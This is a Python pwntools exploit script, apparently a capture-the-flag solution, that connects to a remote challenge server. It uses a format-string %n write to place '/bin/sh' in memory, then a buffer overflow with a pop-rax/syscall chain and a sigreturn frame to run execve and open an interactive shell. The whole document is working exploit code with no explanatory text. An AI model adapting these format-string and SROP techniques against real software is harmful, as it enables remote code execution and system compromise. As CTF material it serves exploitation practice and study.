from pwn import *

target = remote('0.cloud.chals.io', 12655)

syscall = 0x4013bb
writable_area = 0x666000
pop_rax = 0x4013c5

def write_to_writable(string, writable_area):
    for i in range(len(string)):
        payload = b'%' + str(ord(string[i])).encode('ascii') + b'x%8$n' 
        payload += b'c' * (16 - len(payload))  + p64(writable_area + i)
        target.sendline(payload)
        print(target.recvuntil(b'You say'))

print(target.recvuntil(b'<<< Address of pop rax, ret    : 0x4013c5'))

write_to_writable('/bin/sh', writable_area)

#Just me checking that the write worked.
payload = b'%8$s' + b'\x00' * 12 + p64(writable_area)
target.sendline(payload)

print(target.recvuntil(b'You say'))

padding = b'a' * 40
payload = padding 
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)

context.arch = "amd64"

frame = SigreturnFrame()

frame.rip = syscall
frame.rax = 0x3b
frame.rdi = writable_area
frame.rsi = 0
frame.rdx = 0
payload += bytes(frame)
target.sendline(payload)

target.interactive()